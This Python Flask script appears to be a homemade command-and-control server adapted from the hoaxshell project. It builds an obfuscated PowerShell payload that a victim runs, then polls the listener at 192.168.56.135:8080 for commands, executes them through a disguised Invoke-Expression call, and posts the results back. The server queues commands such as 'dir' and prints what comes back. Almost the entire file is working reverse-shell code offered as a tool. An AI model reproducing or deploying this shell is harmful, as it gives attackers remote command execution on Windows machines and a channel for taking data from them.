from flask import Flask, request, Response
import secrets
import uuid, socket


app = Flask(__name__)
app.secret_key = secrets.token_hex(16)
port=8080

class listener():
    def __init__(self):
        # self.hostname = socket.gethostname()
        # self.ip = socket.gethostbyname(self.hostname)\
        self.ip = '192.168.56.135'
        self.cmd =[]
        self.key = str(uuid.UUID(app.secret_key))
        self.id = self.key[0:8]
        self.command = self.key[9:13]
        self.req = self.key[14:18]

        self.sleep = 5
        # template refence from https://github.com/t3l3machus/hoaxshell/tree/main/payload_templates
        protocol = 'http://'
        variable = "$p='"+ protocol +"';$i='"+ self.id +"';$s='"+ self.ip + ":" + str(port) +"';"
        # establish session
        payload_part_1 = '$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/'+ self.key +' -Headers @{"'+ self.id +'"=$i};'
        # while true get commands from C2
        payload_part_2 = 'while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/'+ str(self.command) +' -Headers @{"'+ self.id +'"=$i}).Content;'
        # get execute command
        payload_part_3 = 'if ($c -ne \'None\') {$r=i\'e\'x $c -ErrorAction Stop -ErrorVariable e;'
        payload_part_4 = '$r=Out-String -InputObject $r;'
        # send post request with output from the cmd
        payload_part_5 = '$t=Invoke-WebRequest -Uri $p$s/'+ self.req +' -Method POST -Headers @{"'+ self.id +'"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join \' \')} sleep '+ str(self.sleep) + ' }'
        self.payload = variable + payload_part_1 + payload_part_2 + payload_part_3 + payload_part_4 + payload_part_5

        print('Payload :')
        print(self.payload)


@app.route('/<id>', methods=['get','post'])
def r_shell(id):
    if request.method == 'POST':
        if id == k.req:
            output = request.get_data().decode('utf-8').split(' ')
            to_b_numbers = [ int(n) for n in output ]
            b_array = bytearray(to_b_numbers)
            output = b_array.decode('utf-8', 'ignore')
            print(output)
            
    else:
        # verify the id     
        if id == k.key:
            print('Correct Session')

        elif id == k.command:
            if len(k.cmd) != 0:
                send_command = k.cmd[0]
                k.cmd.pop(0)
            else:
                # No commands
                print('received but no commands')
                send_command = 'None'

            resp =  Response(
                response=send_command.encode('utf-8'),
                status=200,
                headers ={'Access-Control-Allow-Origin':'*'},
                content_type='text/javascript; charset=UTF-8',
                mimetype='text/html'
            )
            print(resp.response)
            return resp
            
    return 'Correct'


k = listener()
k.cmd.append('dir')
app.run(host='192.168.56.135',port=port)
        